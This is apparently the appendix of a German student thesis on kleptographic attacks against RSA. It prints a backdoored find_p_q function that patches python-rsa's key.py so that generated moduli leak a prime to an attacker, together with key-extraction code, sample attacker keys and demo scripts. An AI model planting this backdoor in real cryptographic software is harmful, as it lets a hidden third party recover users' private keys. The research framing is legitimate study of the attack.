\chapter{Anhang}

Aller hier angegebenen Codestellen können in diesen GitHub-Repositories gefunden werden (Stand 15.05.2022).
\begin{itemize}
    \item \url{https://github.com/MeNoSmartBrain/kelpto-python-rsa/blob/main/rsa/key.py}
    \item \url{https://github.com/MeNoSmartBrain/RSA_Kleptography_Studienarbeit/tree/main/code/codeSplit}
\end{itemize}

Programmcode, welcher zu key.py der python-rsa Bibliothek hinzugefügt wurde:

\begin{lstlisting}[language=PyBrIM]
# ------------ Malicious code starts here ------------
"""
Two options for manipulating with the find_p_q function:

1. Option:
    - Before runtime store find_p_q in a variable (__find_p_q)
    - Delete the original find_p_q function
    - ***Attack-Step***
2. Option:
    - At runtime import sys
    - Store the runtime function find_p_q in a variable (__find_p_q)
    - ***Attack-Step***
    - Afterwards replace the runtime function with the overwritten function find_p_q

Attack-Step:
    - Replace the original find_p_q function with the new one
    - Call the new function with the same arguments
    - After receiving p and q by call __find_p_q with the same arguments
    - With p and the public key of the attacker calculate the new q
    - return the p and the new q
"""

"""
# Option 1
"""
del find_p_q  # This might not be necessary, but could avoid a warning about the shadowed name.

"""
# Option 2 --- Part 1
"""
# import sys
# __find_p_q = sys.modules['rsa.key'].find_p_q

"""
Attack-Step:
"""


def find_p_q(
        nbits: int,
        getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
        accurate: bool = True,
) -> typing.Tuple[int, int]:
    """
    This methode shows a kelptographic attack on the python-rsa package.
    Using a RSA-public key of the attacker in the root-directory the return value q is manipulated affecting
    the product of p and q, the public modulus. After a successful attack the attacker can derive the value
    of q from the public modulus, using the private key of the attacker.
    """
    supported_nbits = [32, 64, 128, 256, 512, 1024]
    if nbits not in supported_nbits:
        raise ValueError("Unsupported nbits")

    # TODO pure python implementation path
    from os import path
    resources_dir = path.dirname(path.dirname(__file__))

    in_file = open(resources_dir + '\\attack_key_' + str(nbits), 'rb')
    attack_key = rsa.key.PublicKey.load_pkcs1(in_file.read())
    in_file.close()

    """
    There are multiple options for the optimizer. The optimizer in general limits the value of p. Normally 
    this is not intended in the RSA-algorithm but it helps with the runtime of the attack / generation.
    By incrementing the optimizer by one the margin between lower and upper bound of q roughly doubles.
    On the alternative the RSA-algorithm intends to set such limitations for q (Condition 5):
    bit_size(q) <= nbits - nbits/2.
    Since the optimizer is subtrahend of the minuend nbits and p and q are interchangeable within the 
    prime factor generation, the optimizer is set to nbits/2.  
    """
    optimizer = nbits // 2

    created = False
    while not created:
        """
        Generate the prime factor p. Following these instructions:
        
        To generate the primes p and q, ...
        
        Condition 1: 
        generate a random number of bit length k/2 where k is the required bit length of the modulus n; 
        
        Condition 2:
        set the low bit (this ensures the number is odd) and 
        
        Condition 3:
        set the two highest bits (this ensures that the high bit of n is also set); 
        
        Condition 4:
        check if prime (use the Rabin-Miller test); if not, increment the number by two and check again 
        until you find a prime. This is p. 
        
        Condition 5:
        Repeat for q starting with a random integer of length k - k/2. 
        
        Condition 6:
        If p<q, swop p and q (this only matters if you intend using the CRT form of the private key).
        
        Condition 7: 
        In the extremely unlikely event that p=q, check your random number generator! 
        
        Condition 8: 
        Alternatively, instead of incrementing by 2, just generate another random number each time.
    
        https://www.di-mgt.com.au/rsa_alg.html#crt
        
        Condition 1 is met by calling the find_p_q function with (nbits // 2) as argument.
        Condition 2 is met by the given implementation of python-rsa using the check in is_prime.
        Condition 3 is met not met at the moment due to a lack of implementation in python-rsa. But there is 
            a check a the end of the is_acceptable function within the original find_p_q function. This check 
            ensures that the high bit of n is set. This is also the end goal of condition 3. Therefore it is meet 
            indirectly.
        Condition 4 is met by calling rabimiller_test with the generated p in the is_prime function.
        Condition 5 cannot be met due to q being calculated and not generated. 
        Condition 6 is met by returning max(p, q) as p and min(p, q) as q.
        Condition 7 is check by the is_acceptable function.
        Condition 8 is used in the python-rsa implementation as seen in the get_prime function.
        """
        p = getprime_func(nbits - optimizer)

        try:
            vP = rsa.core.encrypt_int(p, attack_key.e, attack_key.n)

            def padded_concatenation_in_binary(prev, tail):
                prev = "{0:b}".format(prev)
                tail = "{0:b}".format(tail)
                prev = "0" * (int(nbits) - len(prev)) + prev
                tail = "0" * (int(nbits) - len(tail)) + tail

                return int(prev + tail, 2)

            min_bit_construct_Q = padded_concatenation_in_binary((vP - 1), 0)
            max_bit_construct_Q = padded_concatenation_in_binary(vP, pow(2, nbits // 2) - 2)
            lower_bound_Q = (min_bit_construct_Q // p)
            upper_bound_Q = (max_bit_construct_Q // p)

            def find_prime_in_bounds(lower_bound, upper_bound):
                for prime_candidate in range(lower_bound, upper_bound + 1):
                    if rsa.prime.is_prime(prime_candidate):
                        return prime_candidate
                else:
                    raise ValueError("Margin to small: ", lower_bound, upper_bound)

            q = find_prime_in_bounds(lower_bound_Q, upper_bound_Q)

            def is_acceptable(p: int, q: int) -> bool:
                if p == q:
                    raise ValueError("Condition 7 not satisfied.")

                if not nbits * 2 == rsa.common.bit_size(p * q):
                    raise ValueError("Condition 3 not satisfied.")

            is_acceptable(p, q)

            created = True

        except OverflowError:
            pass
        except ValueError:
            pass

    return max(p, q), min(p, q)


"""
# Option 2 --- Part 2
"""

# sys.modules['rsa.key'].find_p_q = find_p_q

# ------------ Malicious code ends here ------------
\end{lstlisting}

\newpage
Programmcode zur Extraktion der Schlüsselparameter, durch gegebenen öffentlichen Schlüsseln des Ziels und privaten Schlüssel des Angreifers:

\begin{lstlisting}[language=PyBrIM]
    import rsaUtil
    import key
    
    
    class AttackUtil:
    
        def __init__(self, attackerKey, public_E, public_N, public_rsa_bit_len):
            self.D = None
            self.E = None
            self.N = None
            self.PhiN = None
            self.Q = None
            self.P = None
            self.vP2 = None
            self.vP1 = None
            self.public_N = public_N
            self.public_E = public_E
            self.attackerKey = attackerKey
            self.rsa_bit_len = public_rsa_bit_len
    
        def attack(self):
            self.extract_vP()
            self.get_prime_factors()
            self.calc_key_params()
            return self.return_params_as_key()
    
        def extract_vP(self):
            self.vP1 = rsaUtil.split_in_binary(self.public_N, self.rsa_bit_len)[0]
            self.vP2 = self.vP1 + 1
    
        def get_prime_factors(self):
            P1 = rsaUtil.decrypt(self.vP1, self.attackerKey.D, self.attackerKey.N)
            P2 = rsaUtil.decrypt(self.vP2, self.attackerKey.D, self.attackerKey.N)
    
            Q1 = self.public_N // P1
            Q2 = self.public_N // P2
    
            if P1 * Q1 == self.public_N:
                self.P = max(P1, Q1)
                self.Q = min(P1, Q1)
            elif P2 * Q2 == self.public_N:
                self.P = max(P2, Q2)
                self.Q = min(P2, Q2)
            else:
                print("Prime factors couldn't be recovered. Either non compromised publicKey or programming error!")
                raise
    
        def calc_key_params(self):
            self.PhiN = rsaUtil.calc_phi_n(self.P, self.Q)
            self.N = self.public_N
    
            created = False
            while not created:
                try:
                    self.E = self.public_E
                    self.D = rsaUtil.modular_multiplicative_inverse(self.E, self.PhiN)
                    created = True
                except ValueError:
                    print("Trying to generate Key failed. Trying again ...")
    
        def return_params_as_key(self):
            ret_key = key.Key(self.rsa_bit_len)
            ret_key.set_key_params(self.P, self.Q, self.PhiN, self.N, self.E, self.D)
    
            return ret_key
\end{lstlisting}

\newpage
Code zur Erstellung von beispielhaften Schlüsseln:

\begin{lstlisting}[language=PyBrIM]
    """
    This script creates public keys from the here listed parameters.
    
    These keys can be used for demonstration purposes. They are valid but not secure in the sense that
    all there secrets are public. Use these to demonstrate the kleptographic attack on the RSA algorithm.
    
    For the attack itself only the public key is needed aka. the public key modulus and the public key exponent.
    
    The other parameters are used to validate the attack later on.
    """
    
    import rsa.key
    
    
    """
    RSA-32 attack key for RSA-64
    """
    attack_key_32bit = {
        "bits": 32,
        'P': 55711,
        'Q': 52267,
        'PhiN': 2911738860,
        'N': 2911846837,
        'E': 65537,
        'D': 2586563513
    }
    
    """
    RSA-64 attack key for RSA-128
    """
    attack_key_64bit = {
        "bits": 64,
        'P': 3337805567,
        'Q': 3588638527,
        'PhiN': 11978177646444835716,
        'N': 11978177653371279809,
        'E': 65537,
        'D': 8251686289907860337
    }
    
    """
    RSA-128 attack key for RSA-256
    """
    attack_key_128bit = {
        "bits": 128,
        'P': 17710801766177235259,
        'Q': 18091019263583148667,
        'PhiN': 320406455925414815348297473514270865828,
        'N': 320406455925414815384099294544031249753,
        'E': 65537,
        'D': 160640788086077788161105305167034074025
    }
    
    """
    RSA-256 attack key for RSA-512
    """
    attack_key_256bit = {
        "bits": 256,
        'P': 3118344847189830409...,
        'Q': 2807599999685083895...,
        'PhiN': 87550649919881508...,
        'N': 87550649919881508449...,
        'E': 65537,
        'D': 25562379819291891056...
    }
    
    """
    RSA-512 attack key for RSA-1024
    """
    attack_key_512bit = {
        "bits": 512,
        'P': 11252199443740...,
        'Q': 11231264183922...,
        'PhiN': 12637642460283227912...,
        'N': 126376424602832279124534...,
        'E': 65537,
        'D': 93697155369510664855900032...
    }
    
    """
    RSA-1024 attack key for RSA-2048
    """
    attack_key_1024bit = {
        "bits": 1024,
        'P': 100812241889570223013691...,
        'Q': 10912393816780377847987697353...,
        'PhiN': 1100102885051513896888947192771855...,
        'N': 1100102885051513896888947192...,
        'E': 65537,
        'D': 606779667803563244346577706...
    }
    
    key_list = [attack_key_32bit, attack_key_64bit, attack_key_128bit, attack_key_256bit, attack_key_512bit, attack_key_1024bit]
    
    for key in key_list:
        temp_pub_key = rsa.key.PublicKey(key['N'], key['E'])
        out_file = open('attack_key_' + str(key['bits']), 'wb')
        out_file.write(temp_pub_key.save_pkcs1())
        out_file.close()
\end{lstlisting}

\newpage
Programmcode zur Eingabe und Verarbeitung von öffentlichen Schlüsseln:

\begin{lstlisting}[language=PyBrIM]
    def main():
    # Choose bits for the user key
    nbits = int(input("Enter the number of bits for the key: "))
    public_e = int(input("Enter the public exponent: "))
    public_n = int(input("Enter the public modulus: "))

    for key_member in attack_key_list:
        if key_member['bits'] == (nbits // 2):
            attack_key_params = key_member
            break
    else:
        raise ValueError("Unsupported key size")

    k_attacker = key.Key(nbits // 2)

    k_attacker.set_key_params(attack_key_params['P'],
                              attack_key_params['Q'],
                              attack_key_params['PhiN'],
                              attack_key_params['N'],
                              attack_key_params['E'],
                              attack_key_params['D'])

    print("Used attacker key: ", attack_key_params)

    attack = attackUtil.AttackUtil(k_attacker, public_e, public_n, nbits)
    extracted_key = attack.attack()
    print("Extracted key: ", extracted_key)
    print("-------------------------------------------------------")
    print("P: ", extracted_key.P)
    print("Q: ", extracted_key.Q)


def automized():
    def print_private_key(private_key):
        print("Private Key: " + str({
            'n': private_key.n,
            'e': private_key.e,
            'd': private_key.d,
            'p': private_key.p,
            'q': private_key.q,
        }))

    nbits = 1024

    keyPair = rsa.newkeys(nbits)

    publicKey = keyPair[0]
    privateKey = keyPair[1]

    print("P:", privateKey.p)
    print("Q:", privateKey.q)
    print_private_key(privateKey)

    print("-------------------------------------------------------")
    print("Public-Key: ")
    print("E:", publicKey.e)
    public_e = publicKey.e
    print("N:", publicKey.n)
    public_n = publicKey.n

    for key_member in attack_key_list:
        if key_member['bits'] == (nbits // 2):
            attack_key_params = key_member
            break
    else:
        raise ValueError("Unsupported key size")

    k_attacker = key.Key(nbits // 2)

    k_attacker.set_key_params(attack_key_params['P'],
                              attack_key_params['Q'],
                              attack_key_params['PhiN'],
                              attack_key_params['N'],
                              attack_key_params['E'],
                              attack_key_params['D'])

    print("Used attacker key: ", attack_key_params)

    attack = attackUtil.AttackUtil(k_attacker, public_e, public_n, nbits)
    extracted_key = attack.attack()
    print("Extracted key: ", extracted_key)
    print("-------------------------------------------------------")
    print("P: ", extracted_key.P)
    print("Q: ", extracted_key.Q)
\end{lstlisting}
